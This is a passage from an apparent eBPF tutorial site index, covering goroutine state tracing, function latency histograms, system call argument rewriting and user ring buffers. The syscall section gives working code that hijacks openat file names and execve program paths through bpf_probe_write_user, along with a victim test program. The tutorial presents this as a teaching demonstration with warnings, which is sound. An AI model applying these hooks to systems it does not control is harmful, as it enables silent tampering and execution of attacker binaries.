<li>RUNNING: The goroutine is currently executing.</li> <li>WAITING: The goroutine is waiting for some event (e.g., I/O, timers).</li> <li>DEAD: The goroutine has finished executing and is terminated.</li> </ul> <p>Understanding these states and how goroutines transition between them is crucial for diagnosing performance issues and ensuring that your Go programs are running efficiently.</p>"},{"location":"tutorials/31-goroutine/#ebpf","title":"eBPF","text":"<p>eBPF is a powerful technology that allows developers to run custom programs inside the Linux kernel without changing the kernel source code or loading kernel modules. Initially designed for packet filtering, eBPF has grown into a versatile tool used for performance monitoring, security, and debugging.</p> <p>By writing eBPF programs, developers can trace various system events, including system calls, network events, and process execution. In this blog, we'll focus on how eBPF can be used to trace the state transitions of goroutines in a Go program.</p>"},{"location":"tutorials/31-goroutine/#the-ebpf-kernel-code","title":"The eBPF Kernel Code","text":"<p>Let's dive into the eBPF kernel code that makes this tracing possible.</p> <pre><code>#include &lt;vmlinux.h&gt;\n#include \"goroutine.h\"\n#include &lt;bpf/bpf_core_read.h&gt;\n#include &lt;bpf/bpf_helpers.h&gt;\n#include &lt;bpf/bpf_tracing.h&gt;\n\n#define GOID_OFFSET 0x98\n\nstruct {\n  __uint(type, BPF_MAP_TYPE_RINGBUF);\n  __uint(max_entries, 256 * 1024);\n} rb SEC(\".maps\");\n\nSEC(\"uprobe/./go-server-http/main:runtime.casgstatus\")\nint uprobe_runtime_casgstatus(struct pt_regs *ctx) {\n  int newval = ctx-&gt;cx;\n  void *gp = ctx-&gt;ax;\n  struct goroutine_execute_data *data;\n  u64 goid;\n  if (bpf_probe_read_user(&amp;goid, sizeof(goid), gp + GOID_OFFSET) == 0) {\n    data = bpf_ringbuf_reserve(&amp;rb, sizeof(*data), 0);\n    if (data) {\n      u64 pid_tgid = bpf_get_current_pid_tgid();\n      data-&gt;pid = pid_tgid;\n      data-&gt;tgid = pid_tgid &gt;&gt; 32;\n      data-&gt;goid = goid;\n      data-&gt;state = newval;\n      bpf_ringbuf_submit(data, 0);\n    }\n  }\n  return 0;\n}\n\nchar LICENSE[] SEC(\"license\") = \"GPL\";\n</code></pre> <ol> <li>Header Files: The code begins by including necessary header files, such as <code>vmlinux.h</code>, which provides kernel definitions, and <code>bpf_helpers.h</code>, which offers helper functions for eBPF programs.</li> <li>GOID_OFFSET: The offset of the <code>goid</code> field is hardcoded to <code>0x98</code>, which is specific to the Go version and the program being traced. This offset may vary between different Go versions or programs.</li> <li>Ring Buffer Map: A BPF ring buffer map is defined to store the goroutine execution data. This buffer allows the kernel to pass information to user space efficiently.</li> <li>Uprobe: The core of this eBPF program is an uprobes (user-level probe) attached to the <code>runtime.casgstatus</code> function in the Go program. This function is responsible for changing the state of a goroutine, making it an ideal place to intercept and trace state transitions.</li> <li>Reading Goroutine ID: The <code>bpf_probe_read_user</code> function reads the goroutine ID (<code>goid</code>) from the user space memory, using the predefined offset.</li> <li>Submitting Data: If the goroutine ID is successfully read, the data is stored in the ring buffer along with the process ID, thread group ID, and the new state of the goroutine. This data is then submitted to the user space for analysis.</li> </ol>"},{"location":"tutorials/31-goroutine/#running-the-program","title":"Running the Program","text":"<p>To run this tracing program, follow these steps:</p> <ol> <li> <p>Compile the eBPF Code: Compile the eBPF program using a compiler like <code>ecc</code> (eBPF Compiler Collection) and generate a package that can be loaded by an eBPF loader.</p> <pre><code>ecc goroutine.bpf.c goroutine.h\n</code></pre> </li> <li> <p>Run the eBPF Program: Use an eBPF loader to run the compiled eBPF program.</p> <pre><code>ecli-rs run package.json\n</code></pre> </li> <li> <p>Output: The program will output the state transitions of goroutines along with their <code>goid</code>, <code>pid</code>, and <code>tgid</code>. Here\u2019s an example of the output:</p> <pre><code>TIME     STATE       GOID   PID    TGID   \n21:00:47 DEAD(6)     0      2542844 2542844\n21:00:47 RUNNABLE(1) 0      2542844 2542844\n21:00:47 RUNNING(2)  1      2542844 2542844\n21:00:47 WAITING(4)  2      2542847 2542844\n</code></pre> </li> </ol> <p>You can find the complete code in https://github.com/eunomia-bpf/bpf-developer-tutorial/tree/main/src/31-goroutine</p> <p>If you want to learn more about eBPF knowledge and practices, you can visit our tutorial code repository https://github.com/eunomia-bpf/bpf-developer-tutorial or website https://eunomia.dev/tutorials/ to get more examples and complete tutorials.</p> <p><code>Uprobe</code> in kernel mode eBPF runtime may also cause relatively large performance overhead. In this case, you can also consider using user mode eBPF runtime, such as bpftime. bpftime is a user mode eBPF runtime based on LLVM JIT/AOT. It can run eBPF programs in user mode, compatible with kernel mode eBPF and can be faster for <code>uprobe</code>.</p>"},{"location":"tutorials/31-goroutine/#conclusion","title":"Conclusion","text":"<p>Tracing goroutine states using eBPF provides deep insights into the execution of Go programs, especially in production environments where traditional debugging tools may fall short. By leveraging eBPF, developers can monitor and diagnose performance issues, ensuring their Go applications run efficiently.</p> <p>Keep in mind that the offsets used in this eBPF program are specific to the Go version and the program being traced. As Go evolves, these offsets may change, requiring updates to the eBPF code.</p> <p>In future explorations, we can extend this approach to trace other aspects of Go programs or even other languages, demonstrating the versatility and power of eBPF in modern software development.</p> <p>Share on  Share on </p>"},{"location":"tutorials/32-http2/README.zh/","title":"trace http2 request in go","text":"<p>TODO: make it work</p> <p>from https://github.com/iovisor/bcc/blob/master/libbpf-tools/funclatency.c.</p> <p>Share on  Share on </p>"},{"location":"tutorials/33-funclatency/","title":"Measuring Function Latency with eBPF","text":"<p>In modern software systems, understanding the performance characteristics of functions\u2014especially those critical to the operation of your application\u2014is paramount. One key metric in performance analysis is function latency, which is the time taken by a function to execute from start to finish. By analyzing function latency, developers can identify bottlenecks, optimize performance, and ensure that their systems operate efficiently under various conditions.</p> <p>This blog post will dive into how to measure function latency using eBPF, an incredibly powerful tool for tracing and monitoring both kernel and user-space programs.</p>"},{"location":"tutorials/33-funclatency/#what-is-ebpf","title":"What is eBPF?","text":"<p>eBPF (Extended Berkeley Packet Filter) is a revolutionary technology that allows developers to write small programs that run in the Linux kernel. Originally designed for packet filtering, eBPF has evolved into a versatile tool for tracing, monitoring, and profiling system behavior. With eBPF, you can instrument almost any part of the Linux kernel or user-space programs to collect performance data, enforce security policies, or even debug systems in real time\u2014all without the need to modify the kernel source code or restart the system.</p> <p>eBPF programs are executed in a sandboxed environment within the kernel, ensuring safety and stability. These programs can attach to various hooks within the kernel, such as system calls, network events, and tracepoints, or even user-space functions using uprobes (user-level probes). The data collected by eBPF programs can then be exported to user space for analysis, making it an invaluable tool for system observability. <code>Uprobe</code> in kernel mode eBPF runtime may also cause relatively large performance overhead. In this case, you can also consider using user mode eBPF runtime, such as bpftime.</p>"},{"location":"tutorials/33-funclatency/#why-is-function-latency-important","title":"Why is Function Latency Important?","text":"<p>Function latency is a critical metric in performance analysis for both kernel and user-space applications. It provides insights into how long a particular function takes to execute, which is crucial for:</p> <ul> <li>Identifying Performance Bottlenecks: High function latency may indicate inefficiencies or issues within the code that need optimization.</li> <li>Ensuring System Responsiveness: In real-time systems or latency-sensitive applications, understanding and minimizing function latency is essential to maintain responsiveness.</li> <li>Profiling and Benchmarking: By measuring the latency of various functions, developers can benchmark their systems and compare the performance of different implementations or configurations.</li> <li>Debugging and Diagnostics: When a system exhibits unexpected behavior or performance degradation, measuring function latency can help pinpoint the source of the problem.</li> </ul> <p>Both kernel-space (e.g., system calls, file operations) and user-space (e.g., library functions) functions can be profiled for latency, providing a comprehensive view of system performance.</p>"},{"location":"tutorials/33-funclatency/#ebpf-kernel-code-for-function-latency","title":"eBPF Kernel Code for Function Latency","text":"<p>Below is an eBPF program designed to measure the latency of a function by hooking into its entry and exit points. The program uses kprobes and kretprobes (for kernel functions) or uprobes and uretprobes (for user-space functions) to capture the start and end times of the function execution.</p> <pre><code>// SPDX-License-Identifier: GPL-2.0\n/* Copyright (c) 2021 Google LLC. */\n#include \"vmlinux.h\"\n#include &lt;bpf/bpf_core_read.h&gt;\n#include &lt;bpf/bpf_helpers.h&gt;\n#include &lt;bpf/bpf_tracing.h&gt;\n#include \"funclatency.h\"\n#include \"bits.bpf.h\"\n\nconst volatile pid_t targ_tgid = 0;\nconst volatile int units = 0;\n\n/* key: pid.  value: start time */\nstruct {\n    __uint(type, BPF_MAP_TYPE_HASH);\n    __uint(max_entries, MAX_PIDS);\n    __type(key, u32);\n    __type(value, u64);\n} starts SEC(\".maps\");\n\n__u32 hist[MAX_SLOTS] = {};\n\nstatic void entry(void)\n{\n    u64 id = bpf_get_current_pid_tgid();\n    u32 tgid = id &gt;&gt; 32;\n    u32 pid = id;\n    u64 nsec;\n\n    if (targ_tgid &amp;&amp; targ_tgid != tgid)\n        return;\n    nsec = bpf_ktime_get_ns();\n    bpf_map_update_elem(&amp;starts, &amp;pid, &amp;nsec, BPF_ANY);\n}\n\nSEC(\"kprobe/dummy_kprobe\")\nint BPF_KPROBE(dummy_kprobe)\n{\n    entry();\n    return 0;\n}\n\nstatic void exit(void)\n{\n    u64 *start;\n    u64 nsec = bpf_ktime_get_ns();\n    u64 id = bpf_get_current_pid_tgid();\n    u32 pid = id;\n    u64 slot, delta;\n\n    start = bpf_map_lookup_elem(&amp;starts, &amp;pid);\n    if (!start)\n        return;\n\n    delta = nsec - *start;\n\n    switch (units) {\n    case USEC:\n        delta /= 1000;\n        break;\n    case MSEC:\n        delta /= 1000000;\n        break;\n    }\n\n    slot = log2l(delta);\n    if (slot &gt;= MAX_SLOTS)\n        slot = MAX_SLOTS - 1;\n    __sync_fetch_and_add(&amp;hist[slot], 1);\n}\n\nSEC(\"kretprobe/dummy_kretprobe\")\nint BPF_KRETPROBE(dummy_kretprobe)\n{\n    exit();\n    return 0;\n}\n\nchar LICENSE[] SEC(\"license\") = \"GPL\";\n</code></pre>"},{"location":"tutorials/33-funclatency/#explanation-of-the-code","title":"Explanation of the Code","text":"<ol> <li> <p>Header Files: The code begins by including the necessary headers like <code>vmlinux.h</code> (which provides kernel definitions) and <code>bpf_helpers.h</code> (which offers helper functions for eBPF programs).</p> </li> <li> <p>Global Variables: <code>targ_tgid</code> is a target process ID (or thread group ID), and <code>units</code> determines the time unit for latency measurement (e.g., microseconds or milliseconds).</p> </li> <li> <p>BPF Maps: A hash map (<code>starts</code>) is defined to store the start time of function executions for each process ID. Another array (<code>hist</code>) is used to store the latency distribution.</p> </li> <li> <p>Entry Function: The <code>entry()</code> function captures the current timestamp when the function is entered and stores it in the <code>starts</code> map keyed by the process ID.</p> </li> <li> <p>Exit Function: The <code>exit()</code> function calculates the latency by subtracting the stored start time from the current time. The result is then categorized into a histogram slot, which is incremented to record the occurrence of that latency range.</p> </li> <li> <p>Probes: The <code>kprobe</code> and <code>kretprobe</code> are used to attach to the entry and exit points of the function, respectively. These probes trigger the <code>entry()</code> and <code>exit()</code> functions to measure the latency.</p> </li> <li> <p>License: The program is licensed under GPL to ensure compliance with kernel licensing requirements.</p> </li> </ol>"},{"location":"tutorials/33-funclatency/#running-the-function-latency-tool","title":"Running the Function Latency Tool","text":""},{"location":"tutorials/33-funclatency/#user-space-function-latency","title":"User-Space Function Latency","text":"<p>To trace the latency of a user-space function, such as the <code>read</code> function in the <code>libc</code> library, you can run the following command:</p> <pre><code># ./funclatency /usr/lib/x86_64-linux-gnu/libc.so.6:read    \ntracing /usr/lib/x86_64-linux-gnu/libc.so.6:read...\ntracing func read in /usr/lib/x86_64-linux-gnu/libc.so.6...\nTracing /usr/lib/x86_64-linux-gnu/libc.so.6:read.  Hit Ctrl-C to exit\n^C\n     nsec                : count    distribution\n         0 -&gt; 1          : 0        |                                        |\n         2 -&gt; 3          : 0        |                                        |\n         4 -&gt; 7          : 0        |                                        |\n         8 -&gt; 15         : 0        |                                        |\n        16 -&gt; 31         : 0        |                                        |\n        32 -&gt; 63         : 0        |                                        |\n       128 -&gt; 255        : 0        |                                        |\n       512 -&gt; 1023       : 0        |                                        |\n      65536 -&gt; 131071     : 651      |****************************************+|\n    131072 -&gt; 262143     : 107      |******                                  |\n    262144 -&gt; 524287     : 36       |**                                      |\n    524288 -&gt; 1048575    : 8        |                                        |\n   8388608 -&gt; 16777215   : 2        |                                        |\nExiting trace of /usr/lib/x86_64-linux-gnu/libc.so.6:read\n</code></pre>"},{"location":"tutorials/33-funclatency/#kernel-space-function-latency","title":"Kernel-Space Function Latency","text":"<p>To trace the latency of a kernel-space function, such as <code>vfs_read</code>, run the following command:</p> <pre><code># sudo ./funclatency -u vfs_read\nTracing vfs_read.  Hit Ctrl-C to exit\n^C\n     usec                : count    distribution\n         0 -&gt; 1          : 0        |                                        |\n         8 -&gt; 15         : 0        |                                        |\n        16 -&gt; 31         : 3397     |****************************************|\n        32 -&gt; 63         : 2175     |*************************               |\n        64 -&gt; 127        : 184      |**                                      |\n       1024 -&gt; 2047       : 0        |                                        |\n       4096 -&gt; 8191       : 5        |                                        |\n   2097152 -&gt; 4194303    : 2        |                                        |\nExiting trace of vfs_read\n</code></pre> <p>These commands trace the execution of the specified function, either in user-space or kernel-space, and print a histogram of the observed latencies, showing the distribution of function execution times.</p> <p>You can find the source code in https://github.com/eunomia-bpf/bpf-developer-tutorial/blob/main/src/33-funclatency</p>"},{"location":"tutorials/33-funclatency/#conclusion","title":"Conclusion","text":"<p>Measuring function latency with eBPF offers deep insights into the performance of both user-space and kernel-space code. By understanding function latency, developers can identify performance bottlenecks, improve system responsiveness, and ensure the smooth operation of their applications.</p> <p>This</p> <p>blog post covered the basics of using eBPF to trace function latency, including an overview of the eBPF kernel code used to perform the tracing. The examples provided demonstrated how to run the tool to trace both user-space and kernel-space functions.</p> <p>For those interested in learning more about eBPF, including more advanced examples and tutorials, please visit our https://github.com/eunomia-bpf/bpf-developer-tutorial or our website https://eunomia.dev/tutorials/.</p> <p>If you are looking for a production-ready tool for function latency measurement, you might want to check out the full implementation available in the BCC repository.</p> <p>Share on  Share on </p>"},{"location":"tutorials/34-syscall/","title":"eBPF Development Practice: Modifying System Call Arguments with eBPF","text":"<p>eBPF (Extended Berkeley Packet Filter) is a powerful feature in the Linux kernel that allows user-defined code to be run, loaded, and updated without the need to modify kernel source code or reboot the kernel. This functionality has enabled a wide range of applications for eBPF, such as network and system performance analysis, packet filtering, and security policies.</p> <p>In this tutorial, we will explore how to use eBPF to modify the arguments of a running system call. This technique can be used for security auditing, system monitoring, or even malicious behavior. However, it is important to note that modifying system call arguments can have negative implications for system stability and security, so caution must be exercised. To implement this functionality, we will use the <code>bpf_probe_write_user</code> feature of eBPF, which allows us to modify memory in the user space and therefore modify system call arguments before the kernel reads them from user space.</p> <p>The complete code for this tutorial can be found in the https://github.com/eunomia-bpf/bpf-developer-tutorial/tree/main/src/34-syscall/ repository on GitHub.</p>"},{"location":"tutorials/34-syscall/#modifying-the-file-name-of-the-open-system-call","title":"Modifying the File Name of the <code>open</code> System Call","text":"<p>This functionality is used to modify the arguments of the <code>openat</code> system call to open a different file. This technique can be useful for:</p> <ol> <li>File Access Auditing: In environments with strict legal and data security requirements, auditors may need to record access to sensitive files. By modifying the <code>openat</code> system call arguments, all attempts to access a specific sensitive file can be redirected to a backup file or a log file.</li> <li>Secure Sandbox: In the early stages of development, it may be desirable to monitor the files accessed by an application. By changing the <code>openat</code> calls, the application can be run in a secure sandbox environment where all file operations are redirected to an isolated file system path.</li> <li>Sensitive Data Protection: For files containing sensitive information, such as a configuration file that contains database passwords, a eBPF-based system can redirect those calls to an encrypted or temporary location to enhance data security.</li> </ol> <p>If leveraged by malicious software, this technique can be used to redirect file operations resulting in data leaks or compromise data integrity. For example, when a program is writing to a log file, an attacker could redirect the data to a controlled file, disrupting the audit trail.</p> <p>Kernel code (partial code, see complete code on Github bpf-developer-tutorial):</p> <pre><code>SEC(\"tracepoint/syscalls/sys_enter_openat\")\nint tracepoint__syscalls__sys_enter_openat(struct trace_event_raw_sys_enter *ctx)\n{\n    u64 pid = bpf_get_current_pid_tgid() &gt;&gt; 32;\n    /* use kernel terminology here for tgid/pid: */\n    if (target_pid &amp;&amp; pid != target_pid) {\n        return 0;\n    }\n    /* store arg info for later lookup */\n    // since we can manually specify the attach process in userspace,\n    // we don't need to check the process allowed here\n\n    struct args_t args = {};\n    args.fname = (const char *)ctx-&gt;args[1];\n    args.flags = (int)ctx-&gt;args[2];\n    if (rewrite) {\n        bpf_probe_write_user((char*)ctx-&gt;args[1], \"hijacked\", 9);\n    }\n    bpf_map_update_elem(&amp;start, &amp;pid, &amp;args, 0);\n    return 0;\n}\n</code></pre> <p>Analysis of the kernel code:</p> <ul> <li><code>bpf_get_current_pid_tgid()</code> retrieves the current process ID.</li> <li>If <code>target_pid</code> is specified and does not match the current process ID, the function returns 0 and does not execute further.</li> <li>We create an <code>args_t</code> structure to store the file name and flags.</li> <li>We use <code>bpf_probe_write_user</code> to modify the file name in the user space memory to \"hijacked\".</li> </ul> <p>The <code>eunomia-bpf</code> is an open-source eBPF dynamic loading runtime and development toolchain aimed at making eBPF program development, building, distribution, and execution easier. You can refer to https://github.com/eunomia-bpf/eunomia-bpf or https://eunomia.dev/tutorials/1-helloworld/ for installing ecc compiler toolchain and ecli runtime. We will use <code>eunomia-bpf</code> to compile and run this example.</p> <p>Compile the code:</p> <pre><code>./ecc open_modify.bpf.c open_modify.h\n</code></pre> <p>Build a simple victim program using make for testing:</p> <pre><code>int main()\n{\n    char filename[100] = \"my_test.txt\";\n    // print pid\n    int pid = getpid();\n    std::cout &lt;&lt; \"current pid: \" &lt;&lt; pid &lt;&lt; std::endl;\n    system(\"echo \\\"hello\\\" &gt; my_test.txt\");\n    system(\"echo \\\"world\\\" &gt;&gt; hijacked\");\n    while (true) {\n        std::cout &lt;&lt; \"Opening my_test.txt\" &lt;&lt; std::endl;\n\n        int fd = open(filename, O_RDONLY);\n        assert(fd != -1);\n\n        std::cout &lt;&lt; \"test.txt opened, fd=\" &lt;&lt; fd &lt;&lt; std::endl;\n        usleep(1000 * 300);\n        // print the file content\n        char buf[100] = {0};\n        int ret = read(fd, buf, 5);\n        std::cout &lt;&lt; \"read \" &lt;&lt; ret &lt;&lt; \" bytes: \" &lt;&lt; buf &lt;&lt; std::endl;\n        std::cout &lt;&lt; \"Closing test.txt...\" &lt;&lt; std::endl;\n        close(fd);\n        std::cout &lt;&lt; \"test.txt closed\" &lt;&lt; std::endl;\n    }\n    return 0;\n}\n</code></pre> <p>Compile and run the test code:</p> <pre><code>$ ./victim\ntest.txt opened, fd=3\nread 5 bytes: hello\nClosing test.txt...\ntest.txt closed\n</code></pre> <p>Use the following command to specify the target process ID to modify the <code>openat</code> system call arguments:</p> <pre><code>sudo ./ecli run package.json --rewrite --target_pid=$(pidof victim)\n</code></pre> <p>You will see that the output changes to \"world\". Instead of opening the \"my_test.txt\" file, it opens the \"hijacked\" file:</p> <pre><code>test.txt opened, fd=3\nread 5 bytes: hello\nClosing test.txt...\ntest.txt closed\nOpening my_test.txt\ntest.txt opened, fd=3\nread 5 bytes: world\nClosing test.txt...\ntest.txt closed\nOpening my_test.txt\ntest.txt opened, fd=3\nread 5 bytes: world\n</code></pre> <p>The complete code with test cases can be found in the https://github.com/eunomia-bpf/bpf-developer-tutorial repository.</p>"},{"location":"tutorials/34-syscall/#modifying-the-process-name-of-bash-execve","title":"Modifying the Process Name of bash <code>execve</code>","text":"<p>This functionality is used to modify the program name when the <code>execve</code> system call is made. In certain auditing or monitoring scenarios, this may be used to track the behavior of specific processes or modify their behavior. However, such modifications can lead to confusion and make it difficult for users or administrators to determine the actual program being executed by the system. The most serious risk is that if malicious users are able to control the eBPF program, they could redirect legitimate system commands to malicious software, resulting in a significant security threat.</p> <pre><code>SEC(\"tp/syscalls/sys_enter_execve\")\nint handle_execve_enter(struct trace_event_raw_sys_enter *ctx)\n{\n    size_t pid_tgid = bpf_get_current_pid_tgid();\n    // Check if we're a process of interest\n    if (target_ppid != 0) {\n        struct task_struct *task = (struct task_struct *)bpf_get_current_task();\n        int ppid = BPF_CORE_READ(task, real_parent, tgid);\n        if (ppid != target_ppid) {\n            return 0;\n        }\n    }\n\n    // Read in program from first arg of execve\n    char prog_name[TASK_COMM_LEN];\n    char prog_name_orig[TASK_COMM_LEN];\n    __builtin_memset(prog_name, '\\x00', TASK_COMM_LEN);\n    bpf_probe_read_user(&amp;prog_name, TASK_COMM_LEN, (void*)ctx-&gt;args[0]);\n    bpf_probe_read_user(&amp;prog_name_orig, TASK_COMM_LEN, (void*)ctx-&gt;args[0]);\n    prog_name[TASK_COMM_LEN-1] = '\\x00';\n    bpf_printk(\"[EXECVE_HIJACK] %s\\n\", prog_name);\n\n    // Program can't be less than out two-char name\n    if (prog_name[1] == '\\x00') {\n        bpf_printk(\"[EXECVE_HIJACK] program name too small\\n\");\n        return 0;\n    }\n\n    // Attempt to overwrite with hijacked binary path\n    prog_name[0] = '/';\n    prog_name[1] = 'a';\n    for (int i = 2; i &lt; TASK_COMM_LEN ; i++) {\n        prog_name[i] = '\\x00';\n    }\n    long ret = bpf_probe_write_user((void*)ctx-&gt;args[0], &amp;prog_name, 3);\n\n    // Send an event\n    struct event *e;\n    e = bpf_ringbuf_reserve(&amp;rb, sizeof(*e), 0);\n    if (e) {\n        e-&gt;success = (ret == 0);\n        e-&gt;pid = (pid_tgid &gt;&gt; 32);\n        for (int i = 0; i &lt; TASK_COMM_LEN; i++) {\n            e-&gt;comm[i] = prog_name_orig[i];\n        }\n        bpf_ringbuf_submit(e, 0);\n    }\n\n    return 0;\n}\n</code></pre> <p>Analysis of the kernel code:</p> <ul> <li>Execute <code>bpf_get_current_pid_tgid</code> to get the current process ID and thread group ID.</li> <li>If <code>target_ppid</code> is set, the code checks if the current process's parent process ID matches.</li> <li>Read the program name from the first argument of <code>execve</code>.</li> <li>Use <code>bpf_probe_write_user</code> to overwrite the argument with a hijacked binary path.</li> </ul> <p>This approach poses a risk as it can be leveraged to hijack the behavior of software, resulting in the execution of malicious code on the system. Using ecc and ecli to compile and run:</p> <pre><code>./ecc exechijack.bpf.c exechijack.h\nsudo ./ecli run package.json\n</code></pre>"},{"location":"tutorials/34-syscall/#conclusion","title":"Conclusion","text":"<p>eBPF provides powerful capabilities for real-time monitoring and intervention in running systems. When used in conjunction with appropriate governance and security policies, this can bring many benefits such as enhanced security, performance optimization, and operational convenience. However, this technology must be used with great care as incorrect operations or misuse can result in system disruption or serious security incidents. In practice, it should be ensured that only authorized users and programs can deploy and manage eBPF programs, and their behavior should be validated in isolated test environments before they are applied in production.</p> <p>Share on  Share on </p>"},{"location":"tutorials/35-user-ringbuf/","title":"eBPF Development Practices: Asynchronously Send to Kernel with User Ring Buffer","text":"<p>eBPF, or Extended Berkeley Packet Filter, is a revolutionary technology in the Linux kernel that allows developers to run custom \"micro programs\" in kernel mode, thereby changing system behavior or collecting fine-grained performance data without modifying kernel code.</p> <p>One unique aspect of eBPF is that it not only allows programs to run in kernel mode to access low-level system states and resources, but it can also communicate with user mode programs through special data structures. One important concept in this regard is the ring buffer between kernel mode and user mode. In many real-time or high-performance applications, the ring buffer is a commonly used data structure. Due to its FIFO (first in, first out) characteristics, data can flow continuously and linearly between the producer and the consumer, avoiding frequent IO operations and unnecessary memory reallocation overhead.</p> <p>In eBPF, two types of ring buffers are provided: user ring buffer and kernel ring buffer, to achieve efficient data communication between user mode and kernel mode. This article is part of the eBPF developer tutorial. More detailed content can be found here: https://eunomia.dev/tutorials/ The source code is open source in the https://github.com/eunomia-bpf/bpf-developer-tutorial.</p>"},{"location":"tutorials/35-user-ringbuf/#user-mode-and-kernel-mode-ring-buffersuser-ring-buffer-and-kernel-ring-buffer","title":"User mode and kernel mode ring buffers\u2014user ring buffer and kernel ring buffer","text":"<p>Around the two main run levels of kernel mode and user mode, eBPF provides two corresponding ring buffer data structures: User ring buffer and Kernel ring buffer.</p> <p>Kernel ring buffer is implemented by eBPF and is specially designed for the Linux kernel to track and record kernel logs, performance statistics, etc. It is the core of data transfer from kernel mode to user mode and can send data from kernel mode to user mode. Kernel ring buffer was introduced in the 5.7 version of the kernel and is now widely used in the kernel logging system, performance analysis tools, etc.</p> <p>For scenarios where the kernel sends to user mode, such as sending kernel monitoring events, asynchronous notifications, status update notifications, etc., the ring buffer data structure can handle them. For example, when we need to monitor the status of a large number of ports of network service programs, the opening, closing, errors, and other status updates of these ports need to be real-time transferred to the user space for processing. Linux kernel's logging system, performance analysis tools, etc., also need to frequently send large amounts of data to user space to support user-friendly display and analysis of these data. In these scenarios, the ring buffer shows extremely high efficiency in sending data from the kernel to the user.</p> <p>User ring buffer is a new type of Map type based on the ring buffer, it provides the semantics of a single user space producer/single kernel consumer. The advantage of this ring buffer is that it provides excellent support for asynchronous message passing, avoiding unnecessary synchronization operations, optimizing data transfer from the kernel to user space, and reducing the system overhead of system calls. User ring buffer was introduced in the 6.1 version of the kernel and its current use cases are relatively limited.</p> <p>bpftime is a user space eBPF runtime that allows existing eBPF applications to run in unprivileged user space using the same libraries and toolchain. It provides Uprobe and Syscall tracing points for eBPF, which significantly improves performance compared to kernel Uprobe and does not require manual code detection or process restart. The runtime supports process eBPF mapping in user space shared memory, and is also compatible with kernel eBPF mapping, allowing seamless operation with the kernel eBPF infrastructure. It includes a high-performance LLVM JIT for various architectures, a lightweight JIT for x86, and an interpreter. GitHub address: https://github.com/eunomia-bpf/bpftime</p> <p>In bpftime, we use the user ring buffer to implement data transmission from user mode eBPF to kernel mode eBPF, and update the maps corresponding to kernel mode eBPF, so that kernel mode and user mode eBPF can work together. The asynchronous characteristics of user ring buffer can avoid unnecessary synchronization operations of system calls, thereby improving the efficiency of data transmission between kernel mode and user mode.</p> <p>The bi-directional ring buffer of eBPF also has similarities to io_uring in some respects, but their design intentions and use cases are different:</p> <ul> <li>Design focus: io_uring primarily focuses on improving the performance and efficiency of asynchronous I/O operations, while eBPF's ring buffer focuses more on data communication and event transmission between the kernel and user space.</li> <li>Application range: io_uring is mainly used in file I/O and network I/O scenarios, while eBPF's ring buffer is more widespread, not limited to I/O operations, but also including system call tracing, network packet processing, etc.</li> <li>Flexibility and extensibility: eBPF provides higher flexibility and extensibility, allowing users to define complex data processing logic and execute it in kernel mode.</li> </ul> <p>Following is a code example where we will show in detail how to use user ring buffer to transmit data from user mode to the kernel, and how to respond accordingly with kernel ring buffer to transmit data from kernel mode to user mode.</p>"},{"location":"tutorials/35-user-ringbuf/#i-implementation-using-ring-buffer-to-transfer-data-between-user-mode-and-kernel-mode","title":"I. Implementation: Using Ring Buffer to Transfer Data Between User Mode and Kernel Mode","text":"<p>With the help of the new BPF MAP, we can implement the transfer of data between user mode and kernel mode through the ring buffer. In this example, we will detail how to create a \"user ring buffer\" in user space and write data to it and then consume this data in kernel space with the <code>bpf_user_ringbuf_drain</code> function. At the same time, we will use the \"kernel ring buffer\" to feed back data from kernel space to user space. To do this, we need to create and operate these two ring buffers separately in user space and kernel space.</p> <p>The complete code can be found at https://github.com/eunomia-bpf/bpf-developer-tutorial/tree/main/src/35-user-ringbuf.</p>"},{"location":"tutorials/35-user-ringbuf/#create-ring-buffer","title":"Create Ring Buffer","text":"<p>In kernel mode, we created a <code>user_ringbuf</code> of type <code>BPF_MAP_TYPE_USER_RINGBUF</code> and a <code>kernel_ringbuf</code> of type <code>BPF_MAP_TYPE_RINGBUF</code>. In user mode, we created an instance of the <code>struct ring_buffer_user</code> structure and managed this user ring buffer through the <code>ring_buffer_user__new</code> function and corresponding operations.</p> <pre><code>    /* Set up ring buffer polling */\n    rb = ring_buffer__new(bpf_map__fd(skel-&gt;maps.kernel_ringbuf), handle_event, NULL, NULL);\n    if (!rb)\n    {\n        err = -1;\n        fprintf(stderr, \"Failed to create ring buffer\\n\");\n        goto cleanup;\n    }\n    user_ringbuf = user_ring_buffer__new(bpf_map__fd(skel-&gt;maps.user_ringbuf), NULL);\n</code></pre>"},{"location":"tutorials/35-user-ringbuf/#writing-kernel-mode-programs","title":"Writing Kernel Mode Programs","text":"<p>We define a <code>kill_exit</code> tracepoint program that will read user data from <code>user_ringbuf</code> with the <code>bpf_user_ringbuf_drain</code> function whenever a process exits. Then, it creates a new record in <code>kernel_ringbuf</code> with the <code>bpf_ringbuf_reserve</code> function and writes relevant information. Finally, the record is submitted with the <code>bpf_ringbuf_submit</code> function so that it can be read by user mode.</p> <pre><code>// SPDX-License-Identifier: GPL-2.0\n/* Copyright (c) 2022 Meta Platforms, Inc. and affiliates. */\n\n#include \"vmlinux.h\"\n#include &lt;bpf/bpf_helpers.h&gt;\n#include &lt;bpf/bpf_tracing.h&gt;\n#include &lt;bpf/bpf_core_read.h&gt;\n#include \"user_ringbuf.h\"\n\nchar _license[] SEC(\"license\") = \"GPL\";\n\nstruct\n{\n    __uint(type, BPF_MAP_TYPE_USER_RINGBUF);\n    __uint(max_entries, 256 * 1024);\n} user_ringbuf SEC(\".maps\");\n\nstruct\n{\n    __uint(type, BPF_MAP_TYPE_RINGBUF);\n    __uint(max_entries, 256 * 1024);\n} kernel_ringbuf SEC(\".maps\");\n\nint read = 0;\n\nstatic long\ndo_nothing_cb(struct bpf_dynptr *dynptr, void *context)\n{\n    struct event *e;\n    pid_t pid;\n    /* get PID and TID of exiting thread/process */\n    pid = bpf_get_current_pid_tgid() &gt;&gt; 32;\n\n    /* reserve sample from BPF ringbuf */\n    e = bpf_ringbuf_reserve(&amp;kernel_ringbuf, sizeof(*e), 0);\n    if (!e)\n        return 0;\n\n    e-&gt;pid = pid;\n    bpf_get_current_comm(&amp;e-&gt;comm, sizeof(e-&gt;comm));\n\n    /* send data to user-space for post-processing */\n    bpf_ringbuf_submit(e, 0);\n    __sync_fetch_and_add(&amp;read, 1);\n    return 0;\n}\n\nSEC(\"tracepoint/syscalls/sys_exit_kill\")\nint kill_exit(struct trace_event_raw_sys_exit *ctx)\n{\n    long num_samples;\n    int err = 0;\n\n    // receive data from userspace\n    num_samples = bpf_user_ringbuf_drain(&amp;user_ringbuf, 